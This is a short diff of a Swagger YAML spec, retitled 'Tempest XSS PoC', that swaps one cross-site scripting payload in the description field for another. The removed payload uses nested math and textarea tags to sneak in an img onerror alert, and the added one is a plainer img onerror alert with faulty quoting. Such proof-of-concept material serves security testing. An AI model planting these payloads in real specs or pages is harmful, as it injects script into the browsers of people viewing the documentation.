@@ -1,10 +1,10 @@
 swagger: '2.0'
 info:
-  title: Example yaml.spec
+  title: Tempest XSS PoC
   description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
+    <img src='#' onerror='alert('Tempest XSS')/>
 paths:
-  /accounts:
+  /tempest:
     get:
       responses:
         '200':
